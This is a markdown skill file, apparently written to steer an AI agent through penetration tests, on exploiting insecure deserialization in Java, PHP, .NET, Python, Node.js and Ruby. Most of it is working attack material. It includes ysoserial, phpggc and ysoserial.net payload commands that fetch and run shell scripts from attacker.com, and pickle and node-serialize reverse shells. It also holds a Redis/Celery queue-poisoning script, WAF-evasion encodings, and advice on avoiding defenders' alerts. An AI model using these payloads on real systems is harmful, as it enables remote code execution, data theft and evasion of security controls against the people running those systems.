---
name: offensive-deserialization
description: "Insecure deserialization exploitation across Java, PHP, .NET, Python, Node.js, and Ruby. Covers gadget chain construction with ysoserial/phpggc/ysoserial.net, ObjectInputStream and BinaryFormatter sink identification, pickle __reduce__ RCE, phar:// wrapper abuse, Jackson polymorphic typing, Json.NET TypeNameHandling, ViewState tampering, node-serialize IIFE injection, Ruby Marshal.load and YAML.load gadgets, framework-specific chains for Spring/Hibernate/Laravel/Symfony, modern attack surfaces including Kubernetes admission webhooks and message queue consumers, WAF bypass through encoding layers and content-type manipulation, and serialVersionUID/JMX/RMI vectors. Activate when the engagement involves deserialization sinks, serialized data in cookies or request bodies, gadget chain development, magic method abuse, ysoserial payload generation, or any review of marshalling and unmarshalling logic in target applications."
---

# Offensive Deserialization

Deserialization vulnerabilities arise when an application reconstructs objects from
serialized byte streams without validating the type, integrity, or origin of those
bytes. Because object reconstruction can trigger constructors, finalizers, and
language-specific magic methods, an attacker who controls the serialized input often
achieves remote code execution before any application-level validation runs. This
skill provides a structured methodology for discovering deserialization sinks,
selecting or building gadget chains, delivering payloads through common and
overlooked channels, and evading defensive controls.

## Quick Workflow

1. Enumerate every entry point that accepts opaque binary or encoded data -- cookies,
   HTTP bodies, headers, message queue messages, file uploads, GraphQL custom scalars,
   gRPC fields, JMX/RMI endpoints.
2. Fingerprint the serialization format by inspecting magic bytes, content-type
   headers, and error behavior (see the Recognition Signatures section).
3. Determine the server-side language and framework version. Pull dependency lists
   from error pages, HTTP headers, or source code if available.
4. Select candidate gadget chains that match the target's classpath or installed
   packages. Generate payloads with ysoserial, phpggc, ysoserial.net, or manual
   pickle/YAML construction.
5. Deliver the payload through the identified entry point. Start with a DNS-only or
   sleep-based proof to confirm execution without destructive side effects.
6. Escalate from proof-of-concept to the engagement objective (reverse shell, file
   read, credential extraction) with the client's authorization.
7. Document the full chain: entry point, serialization format, gadget chain, library
   versions, and proof artifact.

---

## Recognition Signatures

Use these byte patterns and string prefixes to identify serialization formats in
intercepted traffic.

| Format | Signature | Notes |
|---|---|---|
| Java ObjectInputStream | Hex `ac ed 00 05`, Base64 `rO0AB` | Often in cookies, POST bodies, JMX/RMI streams |
| PHP serialize | `O:<len>:"ClassName":` or `a:<count>:{` | Frequently Base64-wrapped in cookies |
| .NET BinaryFormatter | Base64 `AAEAAAD/////` | ViewState, remoting, session state |
| Python pickle | Opcodes `\x80\x04\x95` (protocol 4+), older `(dp0` text mode | Found in Redis caches, Celery tasks, ML pipelines |
| Ruby Marshal | `\x04\x08` leading bytes | Session cookies in older Rails apps |
| YAML (any language) | `--- !ruby/object:` or `!!python/object/apply:` | Tag-based instantiation |
| Java XMLDecoder | `<?xml` with `<java>` or `<object class=` | Legacy Java admin panels |
| .NET Json.NET | `"$type":` key in JSON | TypeNameHandling != None |
| Java Jackson | `["class.name", {` JSON array wrapper | enableDefaultTyping / polymorphic type handling |

---

## Java Deserialization

Java deserialization is the most extensively researched attack surface. The
`ObjectInputStream.readObject()` method instantiates arbitrary classes present on the
classpath, and decades of library code provide usable gadget chains.

### Identifying Sinks

Search source code or decompiled JARs for these patterns:

```java
// Direct ObjectInputStream usage
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

// XMLDecoder (equally dangerous, often overlooked)
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject();

// XStream without allowlist
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput);

// Jackson with polymorphic typing enabled
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // CVE-2017-7525 and successors

// Jackson @JsonTypeInfo on base class
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
public abstract class BaseCommand { }

// JMX/RMI endpoints accepting serialized objects
// Default JMX port 1099, often unauthenticated
```

### serialVersionUID and Classpath Constraints

Every serializable Java class carries a `serialVersionUID`. A mismatch between the
payload's UID and the server's class version causes an `InvalidClassException` before
any gadget logic executes. When you encounter this:

1. Extract the server's `serialVersionUID` from error messages or decompiled JARs.
2. Rebuild the payload with the matching UID using ysoserial's source or a custom
   build.
3. If the exact library version is unknown, brute-force common versions. The UID
   often changes only on major releases.

### ysoserial Gadget Chains

Generate payloads with ysoserial. Match the chain to libraries present on the target
classpath.

```bash
# CommonsCollections chains -- most widely applicable
# CC1 requires commons-collections 3.1, works on JDK < 8u72
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/callback' > payload.bin

# CC5 works on later JDK versions where CC1 is patched
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/callback' > payload.bin

# CC7 uses Hashtable entry point, bypasses some ObjectInputFilter rules
java -jar ysoserial.jar CommonsCollections7 'id > /tmp/proof.txt' > payload.bin

# Spring chain -- requires spring-core + spring-beans on classpath
java -jar ysoserial.jar Spring1 'wget http://attacker.com/shell.sh -O /tmp/s.sh' > payload.bin

# Hibernate chain -- requires hibernate-core
java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64PAYLOAD}|{base64,-d}|bash' > payload.bin

# CommonsBeanutils -- present in many enterprise apps via shaded dependencies
java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.com' > payload.bin

# URLDNS chain -- triggers a DNS lookup, no RCE, safe for detection confirmation
java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.com' > payload.bin

# JRMPClient -- redirects deserialization to attacker-controlled JRMP listener
java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin

# On attacker host, run the JRMP listener to serve a secondary payload
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### JMX/RMI Deserialization

Java Management Extensions (JMX) and RMI registries accept serialized objects over
the wire. They are frequently exposed on internal networks without authentication.

```bash
# Scan for RMI registries
nmap -sV -p 1099,1098,9010,9011 --script rmi-dumpregistry TARGET

# Use marshalsec to exploit RMI/JNDI
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
  "http://attacker.com:8080/#ExploitClass" 1099

# Exploit JNDI injection via deserialization
# Payload triggers lookup to attacker-controlled naming service
java -jar ysoserial.jar JRMPClient 'attacker.com:1099' | \
  base64 -w0 > jmx_payload.b64
```

### Jackson Polymorphic Typing

When Jackson's `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is active,
you supply a JSON array where the first element names the class to instantiate.

```json
["com.sun.rowset.JdbcRowSetImpl",
 {"dataSourceName":"ldap://attacker.com:1389/Exploit",
  "autoCommit":true}]
```

Jackson maintainers continuously add classes to a denylist. Check the target's
Jackson version against known bypass classes. Recent bypasses have used
`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`,
`com.caucho.config.types.ResourceRef`, and similar JNDI-capable beans.

---

## PHP Deserialization

PHP's `unserialize()` function instantiates objects and invokes magic methods
(`__wakeup`, `__destruct`, `__toString`) during reconstruction. The `phar://` stream
wrapper triggers deserialization without an explicit `unserialize()` call.

### Identifying Sinks

```php
// Direct unserialize -- classic vector
$obj = unserialize($userInput);

// phar:// wrapper triggers deserialization on metadata
// Any file operation that accepts a phar:// path is a sink
file_exists("phar://uploads/avatar.jpg");
file_get_contents("phar://user_data/config.phar");
is_dir("phar://" . $userControlledPath);

// Functions that trigger phar deserialization:
// file_exists, is_dir, is_file, file_get_contents, fopen, fileatime,
// filectime, filemtime, filesize, copy, rename, unlink, stat, lstat,
// getimagesize, exif_read_data, hash_file, md5_file, sha1_file
```

### phpggc Gadget Chains

phpggc generates gadget chain payloads for common PHP frameworks.

```bash
# List all available chains
phpggc -l

# Laravel RCE -- uses PendingBroadcast + Dispatcher
# Works on Laravel 5.5 through 9.x depending on chain variant
phpggc Laravel/RCE1 system 'id' -b  # -b for base64 output

# Laravel/RCE10 -- newer chain for recent versions
phpggc Laravel/RCE10 system 'cat /etc/passwd' -s  # -s for serialized output

# Symfony RCE -- targets Symfony's process component
phpggc Symfony/RCE4 exec 'curl http://attacker.com/shell.sh|bash' -b

# Monolog RCE -- present in most Composer-based projects
phpggc Monolog/RCE1 system 'whoami' -b

# Guzzle chain
phpggc Guzzle/RCE1 system 'id' -b

# WordPress-specific (if WP plugins load vulnerable classes)
phpggc WordPress/RCE1 system 'id' -b

# Generate a phar file instead of raw serialized data
phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar

# Generate with PHAR polyglot disguised as JPEG
phpggc Laravel/RCE1 system 'id' -p phar -pp header.jpg -o exploit.jpg
```

### phar:// Exploitation

The phar:// wrapper deserializes the metadata section of a PHAR archive when any
file operation accesses it. This is powerful because the sink is a file function, not
an explicit `unserialize()` call, so it evades many code audits.

```php
// Build a malicious PHAR (attacker side)
// php.ini must have phar.readonly = 0
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

// Set the metadata to your gadget chain object
$object = new VulnerableClass();
$object->command = 'id';
$phar->setMetadata($object);

$phar->stopBuffering();

// Prepend a JPEG header to create a polyglot
$jpegHeader = file_get_contents('legitimate.jpg');
$pharContent = file_get_contents('exploit.phar');
file_put_contents('exploit.jpg', $jpegHeader . $pharContent);
```

Upload the polyglot as an image, then trigger a file operation that references
`phar://uploads/exploit.jpg/test.txt`. The metadata deserializes before the file
operation completes.

---

## .NET Deserialization

.NET offers multiple serialization mechanisms. `BinaryFormatter` is the most
dangerous and Microsoft has formally deprecated it, but legacy applications and
internal tools still rely on it.

### Identifying Sinks

```csharp
// BinaryFormatter -- deprecated, always dangerous
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// SoapFormatter -- equally dangerous, less common
SoapFormatter soap = new SoapFormatter();
object obj = soap.Deserialize(stream);

// NetDataContractSerializer -- type information in the stream
NetDataContractSerializer ndcs = new NetDataContractSerializer();
object obj = ndcs.ReadObject(stream);

// LosFormatter -- used in ViewState
LosFormatter los = new LosFormatter();
object obj = los.Deserialize(viewStateString);

// Json.NET with TypeNameHandling != None
JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // or Objects, Arrays, Auto
});
```

### ysoserial.net Payloads

```powershell
# TypeConfuseDelegate -- works broadly across .NET versions
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com"

# WindowsIdentity -- useful when TypeConfuseDelegate is blocked
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe"

# TextFormattingRunProperties -- targets WPF/XAML parsing
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"

# PSObject -- PowerShell-specific chain
ysoserial.exe -g PSObject -f BinaryFormatter -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

# Generate for Json.NET TypeNameHandling
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd.exe /c whoami > C:\proof.txt"

# Output as base64 for injection into ViewState or cookies
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping attacker.com" -o base64
```

### ViewState Exploitation

ASP.NET ViewState is a serialized blob stored in a hidden form field. When MAC
validation is disabled or the machine key is known, you can inject a gadget chain
directly.

```bash
# Check if ViewState MAC is disabled (rare but found in legacy apps)
# Look for enableViewStateMac="false" in web.config
# or __VIEWSTATEGENERATOR values that suggest no MAC

# If machine key is known (e.g., from web.config disclosure, default keys,
# or HackTheBox-style challenges), generate a ViewState payload:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64COMMAND" \
  --validationalg="SHA1" \
  --validationkey="KNOWN_KEY" \
  --generator="GENERATOR_VALUE" \
  --path="/target/page.aspx" \
  --islegacy
```

### Json.NET TypeNameHandling

When `TypeNameHandling` is set to anything other than `None`, the `$type` property
in JSON controls which .NET type is instantiated.

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

---

## Python Deserialization

Python's `pickle` module executes arbitrary code during deserialization through the
`__reduce__` method. There is no safe way to deserialize untrusted pickle data.

### pickle RCE

```python
import pickle
import os
import base64

# Basic __reduce__ RCE payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/callback',))

# Generate the payload
payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# More sophisticated: use subprocess for output capture
class ExfilExploit:
    def __reduce__(self):
        return (
            __import__('subprocess').check_output,
            (['cat', '/etc/passwd'],)
        )

# Reverse shell via pickle
class ReverseShell:
    def __reduce__(self):
        return (
            os.system,
            ('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',)
        )

# Chained execution for multi-step payloads
class ChainedExploit:
    def __reduce__(self):
        return (eval, (
            "__import__('os').system('wget http://attacker.com/implant -O /tmp/i && chmod +x /tmp/i && /tmp/i')",
        ))
```

### yaml.load RCE

Python's `yaml.load()` without a safe loader permits arbitrary object instantiation
through YAML tags.

```yaml
# Direct command execution
!!python/object/apply:os.system
- "curl http://attacker.com/callback"

# Subprocess with output
!!python/object/apply:subprocess.check_output
- ["id"]

# Module import and execute
!!python/object/new:type
args:
  - exploit
  - !!python/tuple []
  - {"__reduce__": !!python/name:os.system}
```

```bash
# Test for unsafe yaml.load -- this is common in config parsers,
# ML model loading, and data pipeline configurations
# Look for yaml.load() without Loader=yaml.SafeLoader
grep -rn "yaml\.load\s*(" --include="*.py" /path/to/codebase
```

### Other Python Vectors

```python
# shelve module -- uses pickle internally
import shelve
db = shelve.open('data.db')  # If attacker controls the .db file, RCE on open

# marshal module -- lower-level than pickle, still dangerous
import marshal
code = marshal.loads(attacker_controlled_bytes)  # Code object injection

# jsonpickle -- third-party lib, same risks as pickle
import jsonpickle
obj = jsonpickle.decode(attacker_json)  # Arbitrary object instantiation
```

---

## Node.js Deserialization

Node.js deserialization vulnerabilities typically involve libraries that reconstruct
functions from serialized strings and execute them.

### node-serialize IIFE Pattern

The `node-serialize` library uses a `_$$ND_FUNC$$_` marker to denote serialized
functions. Appending `()` creates an Immediately Invoked Function Expression that
executes during deserialization.

```javascript
// Malicious serialized object -- the trailing () causes immediate execution
{"username":"admin","role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/callback')}()"}

// Reverse shell payload
{"rce":"_$$ND_FUNC$$_function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);})}()"}

// Base64 encoded to avoid character issues in transit
{"payload":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64ENCODEDPAYLOAD','base64').toString())}()"}
```

### funcster

The `funcster` library serializes and deserializes JavaScript functions. Any
application that deserializes user-controlled funcster data is vulnerable.

```javascript
// funcster deserializes functions via new Function() constructor
// Payload structure:
{"__js_function": "function(){return require('child_process').execSync('id').toString()}"}
```

### Detection in Traffic

Look for these markers in cookies, session tokens, and request bodies:

- `_$$ND_FUNC$$_` -- node-serialize
- `__js_function` -- funcster
- Serialized JavaScript function strings in Base64-encoded cookies

---

## Ruby Deserialization

Ruby's `Marshal.load` and `YAML.load` both instantiate arbitrary objects and are
common deserialization sinks in Rails applications.

### Marshal.load Gadgets

```ruby
# Ruby Universal RCE gadget chain
# Uses Gem::Installer or Gem::Requirement depending on Ruby version

# ERB template execution chain
require 'erb'
class Exploit
  def initialize
    @template = "<%= `id` %>"
  end
end

# Gem::Requirement chain (Ruby 2.x)
# Serialized payload triggers command execution through Gem internals
payload = Marshal.dump(exploit_chain)
encoded = Base64.strict_encode64(payload)
```

### YAML.load Gadgets

```yaml
# ERB template execution via YAML
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "curl http://attacker.com/callback"
       method_id: :resolve
```

Rails session cookies in older versions (before 5.2 with encrypted cookies) used
signed but not encrypted Marshal data. With the `secret_key_base`, you can forge
arbitrary session cookies containing gadget chains.

---

## Modern Attack Vectors

### Kubernetes Admission Webhooks

Admission controllers deserialize `AdmissionReview` JSON objects. A validating or
mutating webhook that passes fields from the admission request to an unsafe
deserializer creates a cluster-level RCE vector.

```yaml
# Submit a pod with a serialized payload in an annotation
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  annotations:
    config-data: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH..."
spec:
  containers:
  - name: test
    image: nginx
```

If the webhook's reconciliation logic deserializes the annotation value, the payload
executes in the webhook's context, which typically has elevated cluster permissions.

### Message Queue Consumers

Applications consuming from Kafka, RabbitMQ, SQS, or Redis pub/sub often
deserialize message payloads with pickle, Java ObjectInputStream, or Marshal. If you
gain producer access to the queue, you can poison every consumer.

```python
# Poison a Redis-backed Celery task queue
import redis
import pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/callback',))

r = redis.Redis(host='target-redis', port=6379)
r.lpush('celery', pickle.dumps({
    'body': pickle.dumps(Exploit()),
    'content-type': 'application/x-python-serialize',
}))
```

### Serverless and Event-Driven Triggers

Serverless functions that deserialize event payloads from S3 object creation, SNS
notifications, or SQS messages are vulnerable if the event source is attacker-
controllable (for example, a public S3 upload endpoint).

```python
# AWS Lambda handler deserializing S3 object content
def handler(event, context):
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    obj = s3.get_object(Bucket=bucket, Key=key)
    data = pickle.loads(obj['Body'].read())  # RCE if attacker uploads to bucket
```

---

## Evasion Techniques

### WAF and Filter Bypass

```bash
# Double Base64 encoding to bypass pattern matching
cat payload.bin | base64 | base64 > double_encoded.txt

# URL encoding of serialized data
cat payload.bin | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.buffer.read()))"

# Gzip compression before Base64 -- changes the byte pattern entirely
gzip -c payload.bin | base64 > compressed_payload.txt

# Unicode escaping for JSON-based payloads
# Replace ASCII characters with \uXXXX equivalents in $type values

# Split across multiple parameters and reassemble server-side
# Some applications concatenate parameters before deserializing
```

### Content-Type Manipulation

```http
POST /api/endpoint HTTP/1.1
Content-Type: application/x-java-serialized-object

[binary payload]

---

POST /api/endpoint HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<java class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <string>curl http://attacker.com/callback</string>
    </void>
  </object>
</java>

---

POST /api/endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH...
```

### Encoding Layers

Many applications apply multiple encoding layers. You may need to wrap your payload
in several layers to reach the deserializer in the expected format:

1. Serialize the gadget chain.
2. Encrypt with a known or leaked key (session cookies, ViewState machine keys).
3. Apply HMAC if integrity checks are present (requires the signing key).
4. Base64 encode.
5. URL encode if delivered via query parameter.

When you lack the encryption or signing key, look for:
- Default keys in framework documentation or GitHub issues.
- Key disclosure via path traversal, SSRF, or configuration endpoint leaks.
- Padding oracle attacks to decrypt/encrypt without the key.

---

## Detection / Defender View

Understanding how defenders detect deserialization attacks helps you craft payloads
that avoid triggering alerts.

**Signatures defenders watch for:**
- Java magic bytes `ac ed 00 05` or Base64 `rO0AB` in HTTP traffic.
- .NET `AAEAAAD/////` patterns in form fields or cookies.
- PHP serialized object patterns `O:\d+:"` in request parameters.
- `$type` keys in JSON request bodies (Json.NET).
- `_$$ND_FUNC$$_` in Node.js cookies.
- `!!python/object` tags in YAML inputs.

**Runtime defenses you will encounter:**
- Java `ObjectInputFilter` (JEP 290) -- allowlists or denylists specific classes.
  Bypass by finding allowed classes that chain to dangerous behavior, or by using
  chains that operate entirely within the allowed set.
- .NET `SerializationBinder` -- restricts type resolution. Bypass by using types
  within the allowed namespace that still enable code execution.
- PHP `allowed_classes` parameter in `unserialize()` -- limits which classes can be
  instantiated. Bypass by using only allowed classes in the chain, or by reaching
  the sink through phar:// where the parameter is not applied.
- WAF rules matching serialized data patterns -- bypass with encoding layers,
  compression, or content-type switching.
- RASP (Runtime Application Self-Protection) -- instruments deserialization calls.
  May block known gadget chain entry points. Test with URLDNS or sleep-based
  payloads first to determine RASP coverage.

**Log artifacts your attack generates:**
- ClassNotFoundException or ClassCastException in server logs (failed chain).
- Stack traces referencing `ObjectInputStream`, `readObject`, `readResolve`.
- Unusual outbound DNS or HTTP connections from the application server.
- Process spawning from the application's JVM/interpreter process.

---

## Engagement Cheatsheet

| Scenario | Tool | Payload | Verification |
|---|---|---|---|
| Java app with Commons Collections 3.x | ysoserial | `CommonsCollections1` through `7` | URLDNS chain first for safe confirmation |
| Java app, unknown classpath | ysoserial | `URLDNS` for detection, then enumerate with error-based chain testing | DNS callback to attacker-controlled domain |
| PHP Laravel 5.x-9.x | phpggc | `Laravel/RCE1` through `RCE10` | DNS or sleep-based command |
| PHP with file upload + file operation | phpggc | `-p phar -pp header.jpg` polyglot | Trigger phar:// via file_exists or getimagesize |
| .NET with BinaryFormatter | ysoserial.net | `TypeConfuseDelegate` | Process creation or DNS callback |
| .NET ViewState, known machine key | ysoserial.net | `-p ViewState` with key parameters | Blind command execution |
| .NET Json.NET TypeNameHandling | ysoserial.net | `ObjectDataProvider` via `-f Json.Net` | Command output to file or OOB |
| Python pickle in web app | Manual | `__reduce__` with `os.system` | Curl/wget callback |
| Python Celery/Redis | Manual | Pickle payload injected into task queue | All consumers execute payload |
| Python yaml.load | Manual | `!!python/object/apply:os.system` | OOB callback |
| Node.js node-serialize | Manual | `_$$ND_FUNC$$_function(){...}()` | Reverse shell or callback |
| Ruby Marshal in Rails cookie | Manual | Gem::Requirement chain with known secret_key_base | Session forgery + RCE |
| K8s admission webhook | ysoserial/manual | Serialized payload in pod annotation | Callback from webhook pod |
| Unknown format | - | Fuzz with format-specific magic bytes | Monitor for errors and callbacks |

**Safe confirmation sequence (always start here):**
1. Send a URLDNS payload (Java) or DNS-callback command to confirm deserialization
   occurs.
2. Send a sleep/delay payload to confirm code execution without network egress.
3. Escalate to the engagement-authorized objective.

---

## Key References

**Tools:**
- ysoserial (Java): https://github.com/frohoff/ysoserial
- phpggc (PHP): https://github.com/ambionics/phpggc
- ysoserial.net (.NET): https://github.com/pwntester/ysoserial.net
- marshalsec (Java JNDI/RMI): https://github.com/mbechler/marshalsec
- Burp Deserialization Scanner: BApp Store, automated detection
- GadgetInspector (Java static analysis): https://github.com/JackOfMostTrades/gadgetinspector

**Critical CVEs:**
- CVE-2015-4852 -- WebLogic T3 deserialization (Commons Collections)
- CVE-2016-1000031 -- Apache Commons FileUpload deserialization
- CVE-2017-5638 -- Apache Struts 2 OGNL injection via Content-Type (deser-adjacent)
- CVE-2017-7525 -- Jackson enableDefaultTyping RCE
- CVE-2017-9805 -- Apache Struts 2 REST plugin XStream deserialization
- CVE-2018-1000861 -- Jenkins Stapler deserialization
- CVE-2019-2725 -- Oracle WebLogic XMLDecoder deserialization
- CVE-2019-6340 -- Drupal REST deserialization
- CVE-2019-18935 -- Telerik UI .NET deserialization
- CVE-2020-9484 -- Apache Tomcat session persistence deserialization
- CVE-2020-36188 -- Jackson-databind SSRF via JNDI
- CVE-2021-21978 -- VMware View Planner deserialization
- CVE-2022-22947 -- Spring Cloud Gateway SpEL injection (deser-adjacent)
- CVE-2023-34362 -- MOVEit Transfer deserialization chain
- CVE-2023-46604 -- Apache ActiveMQ ClassPathXmlApplicationContext RCE

**Research:**
- "Marshalling Pickles" -- Chris Frohoff and Gabriel Lawrence (AppSecCali 2015)
- "Friday the 13th: JSON Attacks" -- Alvaro Munoz and Oleksandr Mirosh (BlackHat 2017)
- "Are You My Type?" -- Alvaro Munoz and Oleksandr Mirosh (exploiting .NET serializers)
- OWASP Deserialization Cheat Sheet
- PortSwigger Web Security Academy: Insecure Deserialization
